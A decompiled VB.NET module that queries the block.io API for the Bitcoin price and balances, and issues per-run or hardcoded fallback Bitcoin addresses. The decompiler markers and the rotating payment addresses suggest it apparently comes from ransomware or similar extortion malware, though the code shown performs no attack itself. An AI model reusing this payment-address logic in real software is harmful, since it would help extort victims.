Imports System
Imports System.Net
Imports Newtonsoft.Json.Linq

Namespace Main.Tools
	' Token: 0x0200002E RID: 46
	Friend Module BlockIo
		' Token: 0x06000109 RID: 265 RVA: 0x0000A470 File Offset: 0x00008670
		Friend Function GetPrice() As Double
			Try
				Dim text As String = BlockIo.BlockrAddress + "get_current_price/?api_key=" + Config.SelectedWalletApiKey
				Dim webClient As WebClient = New WebClient()
				Dim text2 As String = webClient.DownloadString(text)
				Dim jobject As JObject = JObject.Parse(text2)
				Dim jtoken As JToken = jobject("status")
				If jtoken IsNot Nothing AndAlso jtoken.ToString() = "fail" Then
					Throw New Exception(jobject.ToString())
				End If
				For i As Integer = 0 To 14 - 1
					If jobject("data")("prices")(i)("exchange").ToString() = "coinbase" Then
						Return jobject("data")("prices")(i).Value(Of Double)("price")
					End If
				Next
				Return jobject("data")("prices")(0).Value(Of Double)("price")
			Catch
			End Try
			Return 0.0
		End Function

		' Token: 0x0600010A RID: 266 RVA: 0x0000A5B4 File Offset: 0x000087B4
		Friend Function GetBalanceBtc(address As String) As Double
			Dim text As String = String.Concat(New String() { BlockIo.BlockrAddress, "get_address_balance/?api_key=", Config.SelectedWalletApiKey, "&", address })
			Dim webClient As WebClient = New WebClient()
			Dim text2 As String = webClient.DownloadString(text)
			Dim jobject As JObject = JObject.Parse(text2)
			Dim jtoken As JToken = jobject("status")
			If jtoken IsNot Nothing AndAlso jtoken.ToString() = "fail" Then
				Throw New Exception(jobject.ToString())
			End If
			Return If((jobject("data").Value(Of Double)("available_balance") >= jobject("data").Value(Of Double)("pending_received_balance")), jobject("data").Value(Of Double)("available_balance"), jobject("data").Value(Of Double)("pending_received_balance"))
		End Function

		' Token: 0x0600010B RID: 267 RVA: 0x0000A698 File Offset: 0x00008898
		Friend Function GetNewBtcAddress() As String
			Try
				If Config.NewBTCAddressEachRestart Then
					For Each text As String In Config.api_key
						Dim text2 As String = BlockIo.BlockrAddress + "get_new_address/?api_key=" + text
						Dim webClient As WebClient = New WebClient()
						Dim text3 As String = webClient.DownloadString(text2)
						Dim jobject As JObject = JObject.Parse(text3)
						Dim jtoken As JToken = jobject("status")
						If jtoken Is Nothing OrElse Not(jtoken.ToString() = "fail") Then
							Config.SelectedWalletApiKey = text
							Return jobject("data").Value(Of String)("address")
						End If
					Next
				End If
			Catch
			End Try
			Dim text4 As String = BlockIo.SelectRandomGeneratedAddress()
			BlockIo.randomAddress = text4
			Dim text5 As String
			If text4 <> String.Empty Then
				Config.SelectedWalletApiKey = Config.api_key(BlockIo.randomWallet)
				text5 = BlockIo.randomAddress
			Else
				Config.SelectedWalletApiKey = Config.api_key(0)
				Dim random As Random = New Random()
				text5 = Config.hardcodedWalletAddr(random.[Next](0, Config.hardcodedWalletAddr.Length))
			End If
			Return text5
		End Function

		' Token: 0x0600010C RID: 268 RVA: 0x0000A7B4 File Offset: 0x000089B4
		Friend Function SelectRandomGeneratedAddress() As String
			Try
				Dim random As Random = New Random()
				BlockIo.randomWallet = random.[Next](0, Config.api_key.Length)
				BlockIo.randomAddressUserId = random.[Next](0, Config.MaxNunberOfAddressesInBlockIoAcc)
				Dim text As String = BlockIo.BlockrAddress + "get_my_addresses/?api_key=" + Config.api_key(BlockIo.randomWallet) + "&page=1"
				Dim webClient As WebClient = New WebClient()
				Dim text2 As String = webClient.DownloadString(text)
				Dim jobject As JObject = JObject.Parse(text2)
				Dim jtoken As JToken = jobject("status")
				If jtoken IsNot Nothing AndAlso jtoken.ToString() = "fail" Then
					Throw New Exception(jobject.ToString())
				End If
				Return jobject("data")("addresses")(BlockIo.randomAddressUserId).Value(Of String)("address")
			Catch ex As Exception
			End Try
			Return String.Empty
		End Function

		' Token: 0x040000D6 RID: 214
		Private BlockrAddress As String = "https://block.io/api/v2/"

		' Token: 0x040000D7 RID: 215
		Public randomWallet As Integer

		' Token: 0x040000D8 RID: 216
		Public randomAddressUserId As Integer

		' Token: 0x040000D9 RID: 217
		Public randomAddress As String
	End Module
End Namespace
